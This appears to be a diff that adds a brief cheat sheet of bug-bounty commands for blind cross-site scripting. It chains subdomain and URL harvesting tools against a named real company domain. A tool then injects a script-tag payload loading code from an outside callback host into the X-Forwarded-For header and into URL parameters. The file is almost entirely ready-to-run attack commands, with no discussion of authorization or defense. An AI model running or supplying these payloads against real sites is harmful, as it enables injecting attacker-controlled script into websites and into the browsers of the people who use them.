@@ -1,0 +1,23 @@
+https://bxsshunter.com/dashboard
+
+-----> In X-Forwarded-For Header
+
+subfinder -d gapinc.com | gau | bxss -payload '"><script src=https://yam.bxss.in></script>' -header "X-Forwarded-For"
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+-----> In Parameters
+
+subfinder -d gapinc.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://yam.bxss.in></script>' -parameters
+
+
+# Recommended
+
+---> Subdomain File
+cat subs.txt | waybackurls | bxss -appendMode -payload '"><script src=https://yam.bxss.in></script>' -parameters
+
+cat subs.txt | waybackurls | grep "&" | bxss -appendMode -payload '"><script src=https://yam.bxss.in></script>' -parameters
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Link:- https://www.linkedin.com/posts/ryh04x_bugbounty-bugbountytips-infosec-activity-7040712871395139584-XUWM?utm_source=share&utm_medium=member_desktop
